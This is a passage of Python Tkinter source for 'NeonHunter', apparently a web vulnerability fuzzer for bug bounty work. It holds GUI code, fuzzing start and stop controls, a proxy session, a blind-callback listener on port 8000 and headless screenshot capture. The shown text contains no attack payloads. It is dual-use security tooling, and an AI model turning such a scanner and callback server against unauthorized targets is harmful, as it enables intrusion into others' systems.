        self.canvas.place(relwidth=1, relheight=1)
        self.draw_enhanced_grid()
        
        # Enhanced Title with better visibility
        title_frame = tk.Frame(main_frame, bg='#000000')
        title_frame.place(relx=0.5, rely=0.06, anchor='center')
        
        self.title_label = tk.Label(title_frame, text="⚡ NEONHUNTER v3.5", 
                                   font=('Consolas', 42, 'bold'), 
                                   fg='#00ffff', bg='#000000')
        self.title_label.pack()
        
        self.subtitle_label = tk.Label(title_frame, 
                                      text="🎯 Ultimate Bug Bounty Suite | 👤 By Dickson Godwin Massawe",
                                      font=('Consolas', 12), 
                                      fg='#ff00ff', bg='#000000')
        self.subtitle_label.pack()
        
        threading.Thread(target=self.glitch_title, daemon=True).start()
        
        # Configure enhanced styles
        self.configure_enhanced_styles()
        
        # Create main controls with better visibility
        self.create_enhanced_main_controls(main_frame)
        
        # Create enhanced log area
        self.create_enhanced_log_area(main_frame)
        
        # Enhanced Footer
        self.create_enhanced_footer(main_frame)
    
    def configure_enhanced_styles(self):
        """Configure enhanced ttk styles for better visibility"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Enhanced button style
        style.configure('Enhanced.TButton',
                        font=('Consolas', 11, 'bold'),
                        foreground='#ffffff',
                        background='#220044',
                        borderwidth=3,
                        relief='raised',
                        padding=10)
        style.map('Enhanced.TButton',
                  background=[('active', '#00ffff'), ('disabled', '#333333')],
                  foreground=[('active', '#000000'), ('disabled', '#666666')],
                  relief=[('pressed', 'sunken'), ('!pressed', 'raised')])
        
        # Enhanced entry style
        style.configure('Enhanced.TEntry',
                        fieldbackground='#111133',
                        foreground='#00ffcc',
                        insertcolor='#00ffff',
                        borderwidth=2,
                        padding=10,
                        font=('Consolas', 11))
        
        # Enhanced progress bar
        style.configure('Enhanced.Horizontal.TProgressbar',
                        background='#00ffff',
                        troughcolor='#110033',
                        bordercolor='#00ffff',
                        lightcolor='#00ffff',
                        darkcolor='#0088cc',
                        thickness=20)
        
        # Enhanced combobox
        style.configure('Enhanced.TCombobox',
                        fieldbackground='#111133',
                        background='#220044',
                        foreground='#00ffcc',
                        arrowcolor='#00ffff')
    
    def create_enhanced_main_controls(self, parent):
        """Create enhanced main control widgets with icons"""
        controls_frame = tk.Frame(parent, bg='#000000', relief='ridge', bd=3)
        controls_frame.pack(pady=10, fill='x', padx=20)
        
        # Target URL Section with icon
        url_frame = tk.Frame(controls_frame, bg='#000000')
        url_frame.pack(fill='x', padx=20, pady=15)
        
        tk.Label(url_frame, text="🎯 Target URL:", fg='#00ffff', bg='#000000', 
                font=('Consolas', 14, 'bold')).pack(side='left', padx=5)
        
        self.target_entry = tk.Entry(url_frame, width=80, font=('Consolas', 12), 
                                    bg='#111133', fg='#00ffcc',
                                    relief='sunken', bd=3, insertbackground='#00ffff',
                                    insertwidth=4)
        self.target_entry.pack(side='left', padx=15, fill='x', expand=True)
        self.target_entry.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat=1")
        
        # Quick actions for URL with icons
        quick_frame = tk.Frame(url_frame, bg='#000000')
        quick_frame.pack(side='left', padx=10)
        
        IconButton(quick_frame, text="Test", icon="🔌", 
                  command=self.test_connection, width=8).pack(side='left', padx=2)
        IconButton(quick_frame, text="Copy", icon="📋", 
                  command=self.copy_url, width=8).pack(side='left', padx=2)
        IconButton(quick_frame, text="Clear", icon="🧹", 
                  command=lambda: self.target_entry.delete(0, tk.END), width=8).pack(side='left', padx=2)
        
        # Settings Section
        settings_frame = tk.Frame(controls_frame, bg='#000000')
        settings_frame.pack(fill='x', padx=20, pady=10)
        
        # Delay setting
        tk.Label(settings_frame, text="⏱️ Delay(s):", fg='#ff00ff', bg='#000000', 
                font=('Consolas', 12)).pack(side='left', padx=5)
        self.delay_var = tk.DoubleVar(value=0.5)
        tk.Entry(settings_frame, textvariable=self.delay_var, width=8, 
                bg='#111133', fg='#00ffcc', font=('Consolas', 11)).pack(side='left', padx=5)
        
        # Proxy setting
        tk.Label(settings_frame, text="🌐 Proxy:", fg='#00ff88', bg='#000000',
                font=('Consolas', 12)).pack(side='left', padx=(30,5))
        self.proxy_entry = tk.Entry(settings_frame, width=40, bg='#111133', 
                                   fg='#00ffcc', font=('Consolas', 11))
        self.proxy_entry.pack(side='left', padx=5)
        
        # Initialize additional settings variables
        self.concurrent_requests = tk.IntVar(value=3)
        self.timeout_var = tk.IntVar(value=15)
        self.retry_count = tk.IntVar(value=2)
        self.rate_limit_var = tk.BooleanVar(value=True)
        self.auto_save_var = tk.BooleanVar(value=True)
        
        # Action buttons with icons
        buttons_frame = tk.Frame(controls_frame, bg='#000000')
        buttons_frame.pack(pady=15)
        
        self.fuzz_btn = IconButton(buttons_frame, text="🚀 START FUZZING", 
                                  command=self.start_direct_fuzz, width=18)
        self.fuzz_btn.pack(side='left', padx=10)
        
        self.pause_btn = IconButton(buttons_frame, text="⏯️ PAUSE", 
                                   command=self.toggle_pause, width=14, state='disabled')
        self.pause_btn.pack(side='left', padx=10)
        
        self.stop_btn = IconButton(buttons_frame, text="⏹️ STOP", 
                                  command=self.stop_fuzz, width=14, state='disabled')
        self.stop_btn.pack(side='left', padx=10)
        
        IconButton(buttons_frame, text="📊 REPORT", 
                  command=self.export_advanced_results, width=14).pack(side='left', padx=10)
        
        IconButton(buttons_frame, text="📋 BATCH", 
                  command=self.start_batch_scan, width=14).pack(side='left', padx=10)
        
        # Vulnerability toggles - Enhanced visibility with icons
        vuln_frame = tk.LabelFrame(controls_frame, text="🔍 VULNERABILITIES TO TEST", 
                                  font=('Consolas', 13, 'bold'),
                                  fg='#00ffff', bg='#000000',
                                  labelanchor='n', bd=3, relief='ridge')
        vuln_frame.pack(fill='x', padx=40, pady=15)
        
        toggle_container = tk.Frame(vuln_frame, bg='#000000')
        toggle_container.pack(pady=12, padx=20)
        
        vuln_data = [
            ('XSS', '💉', '#ff0000'),
            ('SQLi', '🗄️', '#ff6600'),
            ('SSTI', '📄', '#ffff00'),
            ('Open Redirect', '↪️', '#00ff00'),
            ('HPP', '🔄', '#00ccff'),
            ('LFI', '📂', '#6600ff'),
            ('Command Injection', '💻', '#ff00ff'),
            ('XXE', '📋', '#ff0088'),
            ('SSRF', '🔄', '#00ff88'),
            ('JWT', '🔑', '#ffff88'),
        ]
        
        for i, (name, icon, color) in enumerate(vuln_data):
            var = tk.BooleanVar(value=True if name in ['XSS', 'SQLi', 'SSTI'] else False)
            self.vulns[name] = var
            
            row = tk.Frame(toggle_container, bg='#000000')
            row.grid(row=i//5, column=i%5, padx=15, pady=10, sticky='w')
            
            # Toggle switch
            AdvancedNeonToggle(row, variable=var, toggle_width=70, toggle_height=30).pack(side='left', padx=5)
            
            # Vulnerability name with icon
            tk.Label(row, text=f"{icon} {name}", fg=color, bg='#000000', 
                    font=('Consolas', 11, 'bold')).pack(side='left', padx=8)
        
        # Enhanced progress bar
        self.progress = ttk.Progressbar(controls_frame, orient='horizontal', 
                                       mode='indeterminate', 
                                       style='Enhanced.Horizontal.TProgressbar',
                                       length=400)
        self.progress.pack(pady=15)
        
        # Status indicator
        self.status_frame = tk.Frame(controls_frame, bg='#000000')
        self.status_frame.pack(pady=10)
        
        self.status_indicator = tk.Label(self.status_frame, text="●", fg='#00ff00',
                                        bg='#000000', font=('Consolas', 20))
        self.status_indicator.pack(side='left', padx=5)
        
        self.status_text_widget = tk.Label(self.status_frame, text="✅ READY", fg='#00ffff',
                                          bg='#000000', font=('Consolas', 12, 'bold'))
        self.status_text_widget.pack(side='left')
    
    def create_enhanced_log_area(self, parent):
        """Create enhanced log area with icons"""
        log_frame = tk.LabelFrame(parent, text="📝 SCAN LOGS", 
                                 font=('Consolas', 13, 'bold'),
                                 fg='#00ffcc', bg='#000000',
                                 labelanchor='n', bd=3, relief='ridge')
        log_frame.pack(fill='both', expand=True, padx=20, pady=(0, 15))
        
        # Log controls with icons
        log_controls = tk.Frame(log_frame, bg='#000000')
        log_controls.pack(fill='x', padx=10, pady=5)
        
        IconButton(log_controls, text="🧹 Clear", 
                  command=self.clear_logs, width=10).pack(side='left', padx=5)
        IconButton(log_controls, text="💾 Save", 
                  command=self.save_logs, width=10).pack(side='left', padx=5)
        IconButton(log_controls, text="📋 Copy", 
                  command=self.copy_logs, width=10).pack(side='left', padx=5)
        IconButton(log_controls, text="📤 Export", 
                  command=self.export_logs, width=10).pack(side='left', padx=5)
        
        # Search bar with icon
        tk.Label(log_controls, text="🔍 Search:", fg='#ff00ff', bg='#000000',
                font=('Consolas', 10)).pack(side='left', padx=(20,5))
        self.log_search = tk.Entry(log_controls, width=30, bg='#111133', fg='#00ffcc')
        self.log_search.pack(side='left', padx=5)
        IconButton(log_controls, text="Find", 
                  command=self.search_logs, width=8).pack(side='left', padx=5)
        
        # Enhanced log text area
        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#000022', 
                                                 fg='#00ff41', font=('Consolas', 10),
                                                 insertbackground='#00ffff', 
                                                 relief='sunken', bd=3,
                                                 wrap='word')
        self.log_text.pack(fill='both', expand=True, padx=10, pady=(0, 10))
        
        # Configure tags for better visibility
        self.log_text.tag_configure('critical', foreground='#ff0000', font=('Consolas', 10, 'bold'))
        self.log_text.tag_configure('high', foreground='#ff6600', font=('Consolas', 10, 'bold'))
        self.log_text.tag_configure('medium', foreground='#ffff00')
        self.log_text.tag_configure('low', foreground='#00ff00')
        self.log_text.tag_configure('success', foreground='#00ff88')
        self.log_text.tag_configure('error', foreground='#ff0000')
        self.log_text.tag_configure('warning', foreground='#ffff00')
        self.log_text.tag_configure('info', foreground='#00ccff')
    
    def create_enhanced_footer(self, parent):
        """Create enhanced footer with icons"""
        footer_frame = tk.Frame(parent, bg='#000000', height=60)
        footer_frame.pack(side='bottom', fill='x')
        footer_frame.pack_propagate(False)
        
        # Left side - Stats with icons
        stats_frame = tk.Frame(footer_frame, bg='#000000')
        stats_frame.pack(side='left', padx=20)
        
        self.stats_display = tk.Label(stats_frame, 
                                     text="📊 Requests: 0 | 🔍 Findings: 0 | ⚠️ Critical: 0",
                                     font=('Consolas', 9), fg='#00ffcc', bg='#000000')
        self.stats_display.pack(pady=10)
        
        # Right side - Author info with icons
        author_frame = tk.Frame(footer_frame, bg='#000000')
        author_frame.pack(side='right', padx=20)
        
        self.author_label = tk.Label(author_frame, 
                                    text="⚡ NEONHUNTER v3.5 | 👤 By Dickson Godwin Massawe | 💻 GitHub: dkhacker707",
                                    font=('Consolas', 9, 'bold'), fg='#ff00ff', bg='#000000')
        self.author_label.pack(pady=10)
        
        # Center - Quick links with icons
        center_frame = tk.Frame(footer_frame, bg='#000000')
        center_frame.pack(expand=True)
        
        quick_links = [
            ("📚 Docs", self.show_documentation),
            ("📊 Stats", self.show_statistics),
            ("🔄 Update", self.check_for_updates),
            ("❓ Help", self.show_help),
            ("🌟 About", self.show_about),
            ("🐛 Bug", self.report_bug),
        ]
        
        for text, command in quick_links:
            btn = tk.Label(center_frame, text=text, fg='#00ff88', bg='#000000',
                          font=('Consolas', 9, 'underline'), cursor='hand2')
            btn.pack(side='left', padx=8)
            btn.bind('<Button-1>', lambda e, cmd=command: cmd())
            btn.bind('<Enter>', lambda e, b=btn: b.config(fg='#00ffff'))
            btn.bind('<Leave>', lambda e, b=btn: b.config(fg='#00ff88'))
    
    def setup_enhanced_ui(self):
        """Setup enhanced UI components with icons"""
        # Side panel for quick actions with icons
        side_panel = tk.Frame(self.root, bg='#111133', width=280)
        side_panel.pack(side='left', fill='y')
        side_panel.pack_propagate(False)
        
        tk.Label(side_panel, text="⚡ QUICK ACTIONS", fg='#00ffff', bg='#111133',
                font=('Consolas', 14, 'bold')).pack(pady=20)
        
        quick_actions = [
            ("🔌 Test Connection", self.test_connection),
            ("📸 Screenshot", self.take_manual_screenshot),
            ("📋 Copy URL", self.copy_url),
            ("🧹 Clear All", self.clear_all),
            ("💾 Save Config", self.save_config),
            ("📥 Load Config", self.load_config),
            ("📊 Statistics", self.show_statistics),
            ("📚 Documentation", self.show_documentation),
            ("🔍 Header Analyzer", self.analyze_headers),
            ("🔐 SSL Checker", self.check_ssl),
            ("📖 Project Docs", self.show_project_docs),
            ("🎬 Tutorials", self.show_tutorials),
        ]
        
        for text, command in quick_actions:
            btn = IconButton(side_panel, text=text, command=command, width=24)
            btn.pack(pady=6, padx=10)
        
        # Add version info at bottom of side panel
        version_frame = tk.Frame(side_panel, bg='#111133')
        version_frame.pack(side='bottom', pady=20)
        tk.Label(version_frame, text="v3.5", fg='#ff00ff', bg='#111133',
                font=('Consolas', 24, 'bold')).pack()
        tk.Label(version_frame, text="PRO EDITION", fg='#00ff88', bg='#111133',
                font=('Consolas', 10)).pack()
        
        # Right panel for live stats
        right_panel = tk.Frame(self.root, bg='#111133', width=300)
        right_panel.pack(side='right', fill='y')
        right_panel.pack_propagate(False)
        
        tk.Label(right_panel, text="📈 LIVE STATS", fg='#00ffff', bg='#111133',
                font=('Consolas', 14, 'bold')).pack(pady=20)
        
        # Stats display
        self.stats_frame = tk.Frame(right_panel, bg='#111133')
        self.stats_frame.pack(pady=10, padx=20, fill='x')
        
        self.create_stats_display()
    
    def create_stats_display(self):
        """Create enhanced stats display"""
        stats_data = [
            ("📊 Total Requests", "0", "#00ffff"),
            ("⚠️ Critical Findings", "0", "#ff0000"),
            ("🔍 Total Findings", "0", "#ff6600"),
            ("⏱️ Scan Duration", "0s", "#00ff88"),
            ("🚀 Speed", "0/s", "#ff00ff"),
            ("❌ Errors", "0", "#ffff00"),
            ("📈 Success Rate", "100%", "#00ffcc"),
            ("🎯 Targets", "0", "#cc00ff"),
        ]
        
        for i, (label, value, color) in enumerate(stats_data):
            stat_frame = tk.Frame(self.stats_frame, bg='#111133')
            stat_frame.pack(fill='x', pady=6)
            
            tk.Label(stat_frame, text=label, fg='#ffffff', bg='#111133',
                    font=('Consolas', 10)).pack(side='left')
            
            stat_value = tk.Label(stat_frame, text=value, fg=color, bg='#111133',
                                 font=('Consolas', 10, 'bold'))
            stat_value.pack(side='right')
            
            # Store reference for updating
            if not hasattr(self, 'stat_labels'):
                self.stat_labels = {}
            self.stat_labels[label] = stat_value
    
    # === ENHANCED ANIMATION METHODS ===
    
    def draw_enhanced_grid(self):
        """Draw enhanced grid with better visibility"""
        self.canvas.delete("grid")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        
        # Main grid lines
        for i in range(0, int(w), 50):
            self.canvas.create_line(i, 0, i, h, fill='#223322', width=1, tags="grid")
        for i in range(0, int(h), 50):
            self.canvas.create_line(0, i, w, i, fill='#223322', width=1, tags="grid")
        
        # Thicker lines every 5th line
        for i in range(0, int(w), 250):
            self.canvas.create_line(i, 0, i, h, fill='#336633', width=2, tags="grid")
        for i in range(0, int(h), 250):
            self.canvas.create_line(0, i, w, i, fill='#336633', width=2, tags="grid")
        
        # Corner highlights
        if w > 100 and h > 100:
            corners = [(0, 0), (w, 0), (0, h), (w, h)]
            for x, y in corners:
                self.canvas.create_oval(x-20, y-20, x+20, y+20, 
                                      outline='#00ffff', width=2, tags="grid")
        
        self.root.after(150, self.draw_enhanced_grid)
    
    def animate_rainbow_border(self):
        """Enhanced rainbow border animation"""
        self.border_canvas.delete("rainbow")
        w = self.border_canvas.winfo_width()
        h = self.border_canvas.winfo_height()
        
        if w < 20 or h < 20:
            self.root.after(50, self.animate_rainbow_border)
            return
        
        thick = self.border_thickness
        seg_angle = 360 / self.border_segments
        offset = self.color_offset
        
        # Draw animated dots
        for i in range(self.border_segments):
            angle = math.radians(offset + i * seg_angle)
            x1 = w/2 + (w/2 - thick) * math.cos(angle)
            y1 = h/2 + (h/2 - thick) * math.sin(angle)
            x2 = w/2 + (w/2) * math.cos(angle)
            y2 = h/2 + (h/2) * math.sin(angle)
            
            color = next(self.rainbow_colors)
            self.border_canvas.create_line(x1, y1, x2, y2, 
                                         fill=color, width=thick, 
                                         tags="rainbow", 
                                         capstyle='round')
        
        self.color_offset = (self.color_offset + 12) % 360
        self.root.after(40, self.animate_rainbow_border)
    
    # === CORE METHODS ===
    
    def play_click_sound(self):
        try:
            winsound.Beep(1200, 80)
            winsound.Beep(1600, 40)
        except:
            pass

    def play_startup_sound(self):
        try:
            freqs = [800, 1000, 1200, 1600, 2000]
            for f in freqs:
                winsound.Beep(f, 80)
                time.sleep(0.05)
        except:
            pass

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        # Determine tag based on message content
        tag = 'info'
        if any(word in msg.lower() for word in ['error', 'failed']):
            tag = 'error'
        elif any(word in msg.lower() for word in ['warning']):
            tag = 'warning'
        elif any(word in msg.lower() for word in ['success']):
            tag = 'success'
        elif any(word in msg.lower() for word in ['critical']):
            tag = 'critical'
        
        self.log_queue.put((f"[{ts}] {msg}\n", tag))

    def process_queue(self):
        try:
            while not self.log_queue.empty():
                msg, tag = self.log_queue.get_nowait()
                self.log_text.insert(tk.END, msg, tag)
                self.log_text.see(tk.END)
        except pyqueue.Empty:
            pass
        self.root.after(100, self.process_queue)
    
    def glitch_title(self):
        colors = ['#00ffff', '#ff00ff', '#ffff00', '#00ff88', '#ff6600']
        while True:
            time.sleep(0.1)
            if self.title_label:
                self.title_label.config(fg=colors[int(time.time()*12)%len(colors)])
    
    def start_advanced_features(self):
        """Start advanced features after UI is fully initialized"""
        self.update_stats_display()
        
        if self.auto_save_var.get():
            threading.Thread(target=self.auto_save_worker, daemon=True).start()
    
    def update_stats_display(self):
        """Update statistics display with better visibility"""
        # Update main stats display
        if hasattr(self, 'stats_display') and self.stats_display:
            stats_text = f"📊 Requests: {self.stats['requests_sent']} | "
            stats_text += f"🔍 Findings: {len(self.results)} | "
            stats_text += f"⚠️ Critical: {self.stats['critical_findings']} | "
            stats_text += f"🚀 Speed: {self.stats.get('payloads_per_second', 0):.1f}/s"
            self.stats_display.config(text=stats_text)
        
        # Update side panel stats
        if hasattr(self, 'stat_labels'):
            self.stat_labels["📊 Total Requests"].config(text=str(self.stats['requests_sent']))
            self.stat_labels["⚠️ Critical Findings"].config(text=str(self.stats['critical_findings']))
            self.stat_labels["🔍 Total Findings"].config(text=str(len(self.results)))
            self.stat_labels["❌ Errors"].config(text=str(self.stats['errors']))
            
            # Calculate success rate
            if self.stats['requests_sent'] > 0:
                success_rate = ((self.stats['requests_sent'] - self.stats['errors']) / 
                               self.stats['requests_sent'] * 100)
                self.stat_labels["📈 Success Rate"].config(text=f"{success_rate:.1f}%")
        
        # Update status text
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            if self.is_running:
                if self.is_paused:
                    status = "⏸️ PAUSED"
                    color = '#ff6600'
                else:
                    status = "🚀 RUNNING"
                    color = '#ffff00'
            else:
                status = "✅ READY"
                color = '#00ff00'
            
            self.status_text_widget.config(text=status, fg=color)
            if hasattr(self, 'status_indicator') and self.status_indicator:
                self.status_indicator.config(fg=color)
        
        self.root.after(1000, self.update_stats_display)
    
    def open_monitor_windows(self):
        if self.live_window and self.live_window.winfo_exists():
            return

        self.live_window = tk.Toplevel(self.root)
        self.live_window.title("📡 LIVE REQUESTS")
        self.live_window.configure(bg='#000000')
        self.live_window.geometry("600x500+50+50")

        tk.Label(self.live_window, text="📡 LIVE REQUESTS", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).pack(pady=10)
        self.live_text = scrolledtext.ScrolledText(self.live_window, bg='#000011', fg='#00ff41', font=('Consolas', 9))
        self.live_text.pack(fill='both', expand=True, padx=15, pady=10)

        self.status_window = tk.Toplevel(self.root)
        self.status_window.title("📊 STATUS CODES")
        self.status_window.configure(bg='#000000')
        self.status_window.geometry("400x450+700+50")

        tk.Label(self.status_window, text="🎯 ONLY WINS", fg='#ff00ff', bg='#000000', font=('Consolas', 14, 'bold')).pack(pady=10)
        self.status_text = tk.Text(self.status_window, bg='#000011', fg='#00ffff', font=('Consolas', 12, 'bold'))
        self.status_text.pack(fill='both', expand=True, padx=15, pady=10)
        self.status_text.tag_configure("200", foreground="#00ff88", font=('Consolas', 14, 'bold'))
        self.status_text.tag_configure("300", foreground="#ff00ff", font=('Consolas', 14, 'bold'))

    def close_monitor_windows(self):
        if self.live_window:
            self.live_window.destroy()
        if self.status_window:
            self.status_window.destroy()
        self.live_window = self.status_window = self.live_text = self.status_text = None

    def log_live_request(self, method, url, status=None):
        if not self.live_text:
            return
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {method.upper()} -> {url}"
        if status is not None:
            line += f" -> {status}"
        self.live_text.insert(tk.END, line + "\n")
        self.live_text.see(tk.END)

        if status and (status == 200 or 300 <= status < 400):
            tag = "200" if status == 200 else "300"
            self.status_text.insert(tk.END, f"{status} {'OK' if status == 200 else 'REDIRECT'}\n", tag)
            self.status_text.see(tk.END)

    def clear_monitors(self):
        self.play_click_sound()
        if self.live_text:
            self.live_text.delete(1.0, tk.END)
        if self.status_text:
            self.status_text.delete(1.0, tk.END)
        self.log("🧹 Monitors cleared")

    def start_direct_fuzz(self):
        try:
            self.play_click_sound()
            target = self.target_entry.get().strip()
            
            if not target:
                messagebox.showerror("Error", "Enter target URL")
                return
            
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            try:
                urlparse(target)
            except:
                messagebox.showerror("Error", "Invalid URL format")
                return
            
            self.scan_start_time = datetime.now()
            self.total_payloads_tested = 0
            self.vuln_counter = 0
            self.results = []
            
            self.stop_event.clear()
            self.is_running = True
            self.is_paused = False
            self.fuzz_btn.config(state='disabled')
            self.pause_btn.config(state='normal', text="⏯️ PAUSE")
            self.stop_btn.config(state='normal')
            
            self.open_monitor_windows()
            self.clear_monitors()
            
            self.progress.start(10)
            
            # Initialize payloads if not already done
            self.initialize_payloads()
            
            self.fuzz_thread = threading.Thread(
                target=self.advanced_direct_fuzz,
                args=(target,),
                daemon=True
            )
            self.fuzz_thread.start()
            
            self.log(f"🚀 ADVANCED FUZZING STARTED: {target}")
            self.log(f"⚙️ Threads: {self.concurrent_requests.get()}")
            self.log(f"⏱️ Timeout: {self.timeout_var.get()}s")
            
            if hasattr(self, 'status_text_widget') and self.status_text_widget:
                self.status_text_widget.config(text="🚀 RUNNING", fg='#ffff00')
            if hasattr(self, 'status_indicator') and self.status_indicator:
                self.status_indicator.config(fg='#ffff00')
            
        except Exception as e:
            self.log(f"❌ Error starting scan: {e}")
            messagebox.showerror("Error", f"Failed to start scan:\n{e}")

    def toggle_pause(self):
        self.play_click_sound()
        if self.is_paused:
            self.is_paused = False
            self.pause_btn.config(text="⏯️ PAUSE")
            self.log("▶️ Fuzzing resumed")
            if hasattr(self, 'status_text_widget') and self.status_text_widget:
                self.status_text_widget.config(text="🚀 RUNNING", fg='#ffff00')
            if hasattr(self, 'status_indicator') and self.status_indicator:
                self.status_indicator.config(fg='#ffff00')
        else:
            self.is_paused = True
            self.pause_btn.config(text="▶️ RESUME")
            self.log("⏸️ Fuzzing paused")
            if hasattr(self, 'status_text_widget') and self.status_text_widget:
                self.status_text_widget.config(text="⏸️ PAUSED", fg='#ff6600')
            if hasattr(self, 'status_indicator') and self.status_indicator:
                self.status_indicator.config(fg='#ff6600')

    def stop_fuzz(self):
        self.play_click_sound()
        self.stop_event.set()
        self.is_running = False
        self.is_paused = False
        self.progress.stop()
        self.fuzz_btn.config(state='normal')
        self.pause_btn.config(state='disabled')
        self.stop_btn.config(state='disabled')
        self.log("⏹️ Fuzzing stopped by user - monitors remain open")
        if hasattr(self, 'status_text_widget') and self.status_text_widget:
            self.status_text_widget.config(text="✅ READY", fg='#00ff00')
        if hasattr(self, 'status_indicator') and self.status_indicator:
            self.status_indicator.config(fg='#00ff00')

    def get_session(self):
        proxy = self.proxy_entry.get().strip()
        proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        s = requests.Session()
        s.headers.update({'User-Agent': 'NeonHunter v3.5'})
        if proxies:
            s.proxies.update(proxies)
        return s

    def start_blind_server(self):
        self.play_click_sound()
        if self.blind_server:
            self.log("🎯 Blind server already running")
            return
        threading.Thread(target=self.run_blind_server, daemon=True).start()
        self.log(f"🎯 Blind server started -> http://{self.callback_ip}:8000")

    def run_blind_server(self):
        global app
        app = self
        self.blind_server = HTTPServer(('0.0.0.0', 8000), BlindCallbackHandler)
        self.blind_server.serve_forever()

    def take_screenshot(self, url, poc_num):
        try:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")

            service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)

            driver.get(url)
            time.sleep(3)

            os.makedirs("screenshots", exist_ok=True)
            path = f"screenshots/PoC_{poc_num}.png"
            driver.save_screenshot(path)
            driver.quit()

            self.log(f"📸 PoC_{poc_num}.png saved")
            return path
        except Exception as e:
            self.log(f"❌ Screenshot failed: {e}")
            return None

    def take_manual_screenshot(self):
        """Take manual screenshot of current target"""
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Enter target URL first")
            return
        
        try:
            screenshot = self.take_screenshot(target, f"manual_{int(time.time())}")
            if screenshot:
                messagebox.showinfo("📸 Screenshot", f"Screenshot saved:\n{screenshot}")
        except Exception as e:
            messagebox.showerror("Error", f"❌ Screenshot failed: {e}")
    
    # === NEW ENHANCED FEATURES ===
    
    def show_project_docs(self):
        """Show enhanced project documentation"""
        docs_text = """
📚 NEONHUNTER PROJECT DOCUMENTATION
====================================

🎯 PROJECT OVERVIEW:
NeonHunter is an advanced web vulnerability scanner designed for
bug bounty hunters, penetration testers, and security researchers.

⚡ KEY FEATURES:
• 10+ vulnerability types detection
• Concurrent scanning (multi-threaded)
• Batch processing for multiple targets
• Custom payload generator
• Professional HTML reporting
• Blind XSS server integration
• Session management
• Real-time monitoring

🔧 TECHNICAL SPECIFICATIONS:
• Language: Python 3.8+
• GUI Framework: Tkinter
• Dependencies: requests, beautifulsoup4, selenium
• Concurrency: ThreadPoolExecutor
• Reporting: HTML, CSV, JSON

📁 PROJECT STRUCTURE:
neonhunter/
├── main.py              # Main application
├── requirements.txt     # Dependencies
├── screenshots/         # Proof of Concept images
├── reports/            # Generated reports
├── logs/               # Scan logs
└── config/             # Configuration files

🚀 GETTING STARTED:
1. Install dependencies: pip install -r requirements.txt
2. Run: python main.py
3. Enter target URL and select vulnerabilities
4. Click START FUZZING

📖 USAGE GUIDE:
• Single Target: Enter URL and scan
• Batch Scanning: Load targets from file
• Custom Payloads: Import your own payloads
• Reporting: Generate professional reports

🔒 SECURITY NOTES:
• Use only on authorized targets
• Respect robots.txt
• Follow ethical hacking guidelines
• Get proper authorization

📞 SUPPORT:
• GitHub: https://github.com/dkhacker707
• Issues: GitHub Issues page
• Email: Contact via GitHub

🎯 ROADMAP:
• Add API testing
• Integrate with Burp Suite
• Add more vulnerability checks
• Improve performance
• Add more reporting formats

📄 LICENSE:
MIT License - Free for educational and authorized use

👨‍💻 DEVELOPER:
Dickson Godwin Massawe
GitHub: @dkhacker707
        """
        
        self.show_info_window("📖 Project Documentation", docs_text)
    
    def show_about(self):
        """Show enhanced about dialog with icons"""
        about_text = """
🌟 NEONHUNTER v3.5 - ULTIMATE BUG BOUNTY SUITE 🌟
===================================================

⚡ "HUNT ETHICALLY, STAY SECURE"

🎯 DEVELOPED BY:
Dickson Godwin Massawe
💻 GitHub: https://github.com/dkhacker707

📅 VERSION: 3.5 PRO EDITION
📦 RELEASE: Professional Bug Bounty Suite

🔥 CORE FEATURES:
✅ 10+ Vulnerability Types Detection
✅ Concurrent Multi-threaded Scanning
✅ Batch Target Processing
✅ Professional HTML Reports
✅ Blind XSS Server Integration
✅ Custom Payload Generator
✅ Session Management
✅ Real-time Monitoring
✅ Screenshot Capture
✅ Advanced Detection Engine

🎨 UI ENHANCEMENTS:
✅ Optimized for Better Visibility
✅ Color-coded Severity Levels
✅ Real-time Statistics
✅ Keyboard Shortcuts
✅ Animated Elements
✅ High Contrast Mode
✅ Responsive Design

🔧 TECHNOLOGIES USED:
• Python 3.8+
• Tkinter (GUI)
• Requests (HTTP)
• BeautifulSoup4 (Parsing)
• Selenium (Screenshots)
• Threading (Concurrency)

📊 REPORTING CAPABILITIES:
• Professional HTML Reports
• CSV Export
• JSON Export
• Statistics Dashboard
• Executive Summaries
• Detailed Findings

🚀 PERFORMANCE:
• Concurrent scanning (1-10 threads)
• Batch processing
• Memory efficient
• Fast payload testing
• Real-time updates

🔒 SECURITY ETHICS:
• For authorized testing only
• Educational purpose
• Respect privacy
• Follow guidelines
• Report responsibly

📞 CONTACT & SUPPORT:
• GitHub Issues: Bug reports
• Feature Requests: GitHub
• Security Concerns: Private disclosure

🎯 MISSION:
To provide security professionals with powerful,
easy-to-use tools for identifying web vulnerabilities
and improving application security.

📄 LICENSE:
MIT License - Free for educational and authorized testing

💡 TIP:
Always get proper authorization before testing.
Great power comes with great responsibility!

⚡ "CODE WITH PASSION, HUNT WITH PRECISION"
        """
        
        self.show_info_window("🌟 About NeonHunter", about_text, width=80, height=40)
    
    def show_info_window(self, title, text, width=70, height=30):
        """Show information in a scrollable window"""
        window = tk.Toplevel(self.root)
        window.title(title)
        window.configure(bg='#000000')
        window.geometry("800x600")
        
        # Title
        tk.Label(window, text=title, fg='#00ffff', bg='#000000',
                font=('Consolas', 16, 'bold')).pack(pady=10)
        
        # Scrollable text
        text_frame = tk.Frame(window, bg='#000000')
        text_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side='right', fill='y')
        
        text_widget = tk.Text(text_frame, wrap='word', bg='#111133', fg='#00ffcc',
